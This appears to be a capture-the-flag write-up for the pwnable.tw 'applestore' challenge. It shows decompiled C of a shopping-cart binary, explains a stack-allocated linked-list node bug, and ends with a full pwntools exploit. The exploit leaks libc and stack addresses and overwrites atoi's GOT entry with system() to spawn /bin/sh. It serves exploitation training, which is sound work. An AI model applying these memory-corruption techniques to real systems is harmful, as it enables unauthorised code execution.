# Challenge Description
## File type
```bash
$ file applestore
applestore: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter ./ld-2.23.so, for GNU/Linux 2.6.24, BuildID[sha1]=35f3890fc458c22154fbc1d65e9108a6c8738111, not stripped
```

## Binary Protection
```bash
$ checksec applestore
[*] './applestore'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8046000)
    Stripped:   No
```

## Background
- `applestore` is a shopping management system allowing user to interact with products and their shopping cart through these following operations:
	- List all available products
	- Add a product into user's shopping cart
	- Remove a product from shopping cart
	- List all added products in shopping cart
	- Checkout
```
=== Menu ===
1: Apple Store
2: Add into your shopping cart
3: Remove from your shopping cart
4: List your shopping cart
5: Checkout
6: Exit
> 1
=== Device List ===
1: iPhone 6 - $199
2: iPhone 6 Plus - $299
3: iPad Air 2 - $499
4: iPad Mini 3 - $399
5: iPod Touch - $199
> 2
Device Number> 1
You've put *iPhone 6* in your shopping cart.
Brilliant! That's an amazing idea.
> 4
Let me check your cart. ok? (y/n) > y
==== Cart ====
1: iPhone 6 - $199
> 
```
- Here are some important functions which are responsible for those opertions:
	- `add()` function to add a product into cart
	```c
	unsigned int add()
	{
		const char **productNode; // [esp+1Ch] [ebp-2Ch]
		char buffer[22]; // [esp+26h] [ebp-22h] BYREF
		unsigned int canary; // [esp+3Ch] [ebp-Ch]

		canary = __readgsdword(0x14u);
		printf("Device Number> ");
		fflush(stdout);
		my_read((int)buffer, 21);
		switch ( atoi(buffer) )
		{
			case 1:
				productNode = (const char **)create("iPhone 6", 199);
				insert(productNode);
				goto LABEL_8;
			case 2:
				productNode = (const char **)create("iPhone 6 Plus", 299);
				insert(productNode);
				goto LABEL_8;
			case 3:
				productNode = (const char **)create("iPad Air 2", 499);
				insert(productNode);
				goto LABEL_8;
			case 4:
				productNode = (const char **)create("iPad Mini 3", 399);
				insert(productNode);
				goto LABEL_8;
			case 5:
				productNode = (const char **)create("iPod Touch", 199);
				insert(productNode);
	LABEL_8:
				printf("You've put *%s* in your shopping cart.\n", *productNode);
				puts("Brilliant! That's an amazing idea.");
				break;
			default:
				puts("Stop doing that. Idiot!");
				break;
		}
		return __readgsdword(0x14u) ^ canary;
	}
	```

	- `delete()` function to remove a product from cart
	```c
	unsigned int delete()
	{
		int currentIndex; // [esp+10h] [ebp-38h]
		int currentPtr; // [esp+14h] [ebp-34h]
		int targetIndex; // [esp+18h] [ebp-30h]
		int nextPtr; // [esp+1Ch] [ebp-2Ch]
		int previousPtr; // [esp+20h] [ebp-28h]
		char buffer[22]; // [esp+26h] [ebp-22h] BYREF
		unsigned int canary; // [esp+3Ch] [ebp-Ch]

		canary = __readgsdword(0x14u);
		currentIndex = 1;
		currentPtr = dword_804B070;                   // (*myCart).next
		printf("Item Number> ");
		fflush(stdout);
		my_read((int)buffer, 21);
		targetIndex = atoi(buffer);
		while ( currentPtr )
		{
			if ( currentIndex == targetIndex )
			{
				nextPtr = *(_DWORD *)(currentPtr + 8);
				previousPtr = *(_DWORD *)(currentPtr + 12);
				if ( previousPtr )
					*(_DWORD *)(previousPtr + 8) = nextPtr;
				if ( nextPtr )
					*(_DWORD *)(nextPtr + 12) = previousPtr;
				printf("Remove %d:%s from your shopping cart.\n", currentIndex, *(const char **)currentPtr);
				return __readgsdword(0x14u) ^ canary;
			}
			++currentIndex;
			currentPtr = *(_DWORD *)(currentPtr + 8);
		}
		return __readgsdword(0x14u) ^ canary;
	}
	```

	- `cart()` function to list all added products in cart
	```c
	int cart()
	{
		int index; // eax
		int currentIndex; // [esp+18h] [ebp-30h]
		int totalPrice; // [esp+1Ch] [ebp-2Ch]
		int i; // [esp+20h] [ebp-28h]
		char buffer[22]; // [esp+26h] [ebp-22h] BYREF
		unsigned int canary; // [esp+3Ch] [ebp-Ch]

		canary = __readgsdword(0x14u);
		currentIndex = 1;
		totalPrice = 0;
		printf("Let me check your cart. ok? (y/n) > ");
		fflush(stdout);
		my_read((int)buffer, 21);
		if ( buffer[0] == 'y' )
		{
			puts("==== Cart ====");
			for ( i = dword_804B070; i; i = *(_DWORD *)(i + 8) )
			{
				index = currentIndex++;
				printf("%d: %s - $%d\n", index, *(const char **)i, *(_DWORD *)(i + 4));
				totalPrice += *(_DWORD *)(i + 4);
			}
		}
		return totalPrice;
	}
	```
	
	- `checkout()` function to checkout the cart
	```c
	unsigned int checkout()
	{
		int totalPrice; // [esp+10h] [ebp-28h]
		_DWORD *productName; // [esp+18h] [ebp-20h] BYREF
		int price; // [esp+1Ch] [ebp-1Ch]
		unsigned int canary; // [esp+2Ch] [ebp-Ch]

		canary = __readgsdword(0x14u);
		totalPrice = cart();
		if ( totalPrice == 7174 )
		{
			puts("*: iPhone 8 - $1");
			asprintf(&productName, "%s", "iPhone 8");
			price = 1;
			insert((int)&productName);
			totalPrice = 7175;
		}
		printf("Total: $%d\n", totalPrice);
		puts("Want to checkout? Maybe next time!");
		return __readgsdword(0x14u) ^ canary;
	}
	```

- The special thing is that this program manages your cart through a **Double Linked List**. Each node is about a product added to cart. That structure can be shown by `struct` in C code:
```c
struct Node {
	char *productName;
	int price;
	struct Node *next;
	struct Node *previous;
};
```

- This `Node` struct is controlled by 2 functions:
	- `create()` function which dynamically allocates a new `Node`
	```c
	_DWORD *__cdecl create(const char *productName, int price)
	{
		_DWORD *ptr; // [esp+1Ch] [ebp-Ch]

		ptr = (_DWORD *)malloc(16);
		ptr[1] = price;
		asprintf(ptr, "%s", productName);
		ptr[2] = 0;
		ptr[3] = 0;
		return ptr;
	}
	```

	- `insert()` function which inserts a Node into an existed **Double Linked List**
	```c
	int __cdecl insert(int productNode)
	{
		int result; // eax
		_DWORD *i; // [esp+Ch] [ebp-4h]

		for ( i = &myCart; i[2]; i = (_DWORD *)i[2] )
			;
		i[2] = productNode;
		result = productNode;
		*(_DWORD *)(productNode + 12) = i;
		return result;
	}
	```

# Vulnerability
- In `checkout()` function, if the total price is equal to 7174, a special node will be created and saved on stack. It then is inserted into the global **Double Linked List**. 
- When analyzing call other functions, they all have a `buffer` array of `char` and a segment of `buffer` array matches `productName` property of `Node`. Moreover, `cart()` function allow to user to input more than 1 character for confirmation. Therefore, we can leverage this vulnerability to leak memory address.

# Exploitation
## Create the special node
- I calculated that `7174 = 199 * 19 + 399 + 499 * 6`. Therefore, I just need to perform add operation corresponding that result and then call `checkout()` to create the special node.

## Leak Libc
- To leak the base address of libc, we exploit the above vulnerbility, call `cart()` function and input a confirmation string including the address of a function in `GOTS`. After the program list all products in cart with their name, it will print out the address of that libc function.

## Leak Stack Address
- After having base address of libc, we evaluate the address of `environ` symbol which points to an array of strings on stack containing **environment variables**. Do the same technique to leak libc, the program will print out the address of that array on stack and we leaked stack address.

## Get Shell
- We call `delete()` function to do arbitrary write, write the address in `GOTS` into `ebp` register. So that, in `handler()` function, we can do arbitrary write again into a function in `GOTS`. I chose `atoi()` function and replace with the address of `system()` function and the `/bin/sh` script.

## Exploit Code
```python
#!/usr/bin/env python
from pwn import *
import utils

context.terminal = ['kitten', '@', 'launch', '--type=os-window']
context.log_level = "debug"
context.arch = "i386"

TARGET = "./bin/applestore"
LIBC = "./lib/libc_32.so.6"

target = process(TARGET)
target = remote("chall.pwnable.tw", 10104)
# gdb.attach(target, gdbscript="break *(delete + 115)")

exe = ELF(TARGET)
libc = ELF(LIBC)

# myCart = 0x804b068

# 7174 = 199 * 19 + 399 + 499 * 6

def add(index: int):
	target.sendafter(b"> ", b"2")
	target.sendafter(b"Device Number> ", str(index).encode())

def delete(index: int, data: bytes = b""):
	target.sendafter(b"> ", b"3")
	target.sendafter(b"Item Number> ", str(index).encode() + data)

def cart(confirmation: bytes = b"y"):
	target.sendafter(b"> ", b"4")
	target.sendafter(b"> ", confirmation)

def checkout():
	target.sendafter(b"> ", b"5")
	target.sendafter(b"> ", b"y")

# 7174 = 199 * 19 + 399 + 499 * 6 
for _ in range(19):
	add(1)

add(4)

for _ in range(6):
	add(3)

checkout()

# Leak Libc
read_got = exe.got['read']
payload = b"y" * 2 + p32(read_got) + b"\x00" * 12
cart(payload)
target.recvuntil(b"27: ")
read_addr = u32(target.recv(4))
libc.address = read_addr - libc.symbols['read']

# Leak Stack
environ_addr = libc.symbols['environ']
payload = b"y" * 2 + p32(environ_addr) + b"\x00" * 12
cart(payload)
target.recvuntil(b"27: ")
saved_ebp_addr = u32(target.recv(4)) - 0x104

offset_22_from_atoi_got = 0x804b062
payload = p32(environ_addr) + b"\x00" * 4 + p32(offset_22_from_atoi_got) + p32(saved_ebp_addr - 8)
delete(27, payload)

system_addr = libc.symbols['system']
payload = p32(system_addr) + b"|| /bin/sh"
target.sendafter(b"> ", payload)

target.interactive()
```
